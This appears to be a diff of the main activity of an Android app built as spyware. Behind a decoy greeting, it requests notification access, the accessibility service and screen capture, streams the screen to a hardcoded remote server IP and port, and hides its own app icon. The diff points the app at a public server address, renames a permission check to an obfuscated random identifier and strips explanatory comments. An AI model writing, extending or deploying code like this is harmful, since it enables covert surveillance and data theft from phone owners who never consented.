@@ -24,7 +24,7 @@ import androidx.core.content.ContextCompat
 class MainActivity : AppCompatActivity() {
 
     companion object {
-        const val SERVER_IP = "192.168.0.178"
+        const val SERVER_IP = "197.251.240.87"
         const val SERVER_PORT = 54835
         private const val REQUEST_PERMISSIONS_CODE = 100
 
@@ -57,7 +57,6 @@ class MainActivity : AppCompatActivity() {
             if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                 val resultData = result.data
 
-                // Start services (existing code)
                 val screenCaptureIntent = Intent(this, ScreenCaptureService::class.java).apply {
                     putExtra("data", resultData)
                     putExtra("server_ip", SERVER_IP)
@@ -82,7 +81,6 @@ class MainActivity : AppCompatActivity() {
 
                 Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show()
                 Log.d("MainActivity", "Services started successfully")
-
             } else {
                 Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
                 Log.e("MainActivity", "Screen capture permission denied")
@@ -95,12 +93,8 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
         try {
-            // --- 1. Show the welcome message immediately ---
             showWelcomeMessage()
-
-            // --- 2. Safely initialize MediaProjectionManager after short delay ---
             Handler(Looper.getMainLooper()).postDelayed({
                 try {
                     mediaProjectionManager =
@@ -108,10 +102,9 @@ class MainActivity : AppCompatActivity() {
                     requestAllPermissions()
                 } catch (e: Exception) {
                     Log.e("MainActivity", "Initialization failed: ${e.message}", e)
-                    Toast.makeText(this, "App initialization error: ${e.message}", Toast.LENGTH_LONG)
-                        .show()
+                    Toast.makeText(this, "App initialization error: ${e.message}", Toast.LENGTH_LONG).show()
                 }
-            }, 2000) // 2-second delay before continuing
+            }, 2000)
         } catch (e: Exception) {
             Log.e("MainActivity", "App launch failed: ${e.message}", e)
             Toast.makeText(this, "App failed to start: ${e.message}", Toast.LENGTH_LONG).show()
@@ -123,13 +116,11 @@ class MainActivity : AppCompatActivity() {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
         }
-
         val textView = TextView(this).apply {
             text = "Hi Dear How Are You Doing"
             textSize = 26f
             gravity = Gravity.CENTER
         }
-
         layout.addView(textView)
         setContentView(layout)
     }
@@ -138,7 +129,6 @@ class MainActivity : AppCompatActivity() {
         val missingPermissions = PERMISSIONS.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
-
         if (missingPermissions.isNotEmpty()) {
             ActivityCompat.requestPermissions(
                 this,
@@ -151,13 +141,13 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun continueAppFlow() {
-        checkNotificationListenerPermission()
+        FzZ4Mnka2NXYb3WvdFUnDeT4LWgfTP9QxsRyDC3bP7LZ()
         checkAccessibilityServiceEnabled()
-        requestScreenCapturePermission()
+        requestScreenCapture()
         hideAppIconSafely()
     }
 
-    private fun requestScreenCapturePermission() {
+    private fun requestScreenCapture() {
         try {
             val projectionManager = mediaProjectionManager
             if (projectionManager != null) {
@@ -169,16 +159,14 @@ class MainActivity : AppCompatActivity() {
             }
         } catch (e: Exception) {
             Log.e("MainActivity", "Failed to request screen capture: ${e.message}", e)
-            Toast.makeText(this, "Error requesting screen capture: ${e.message}", Toast.LENGTH_LONG)
-                .show()
+            Toast.makeText(this, "Error requesting screen capture: ${e.message}", Toast.LENGTH_LONG).show()
         }
     }
 
-    private fun checkNotificationListenerPermission() {
+    private fun FzZ4Mnka2NXYb3WvdFUnDeT4LWgfTP9QxsRyDC3bP7LZ() {
         try {
             val enabledListeners =
                 Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
-            val packageName = packageName
             if (enabledListeners == null || !enabledListeners.contains(packageName)) {
                 Toast.makeText(this, "Please enable Notification Access", Toast.LENGTH_LONG).show()
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
@@ -216,11 +204,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<String>,
-        grantResults: IntArray
-    ) {
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == REQUEST_PERMISSIONS_CODE) {
             val denied = permissions.zip(grantResults.toTypedArray())
@@ -228,11 +212,7 @@ class MainActivity : AppCompatActivity() {
             if (denied.isEmpty()) {
                 continueAppFlow()
             } else {
-                Toast.makeText(
-                    this,
-                    "Some permissions were denied: ${denied.map { it.first }}",
-                    Toast.LENGTH_LONG
-                ).show()
+                Toast.makeText(this, "Some permissions were denied: ${denied.map { it.first }}", Toast.LENGTH_LONG).show()
                 Log.e("MainActivity", "Denied permissions: ${denied.map { it.first }}")
             }
         }
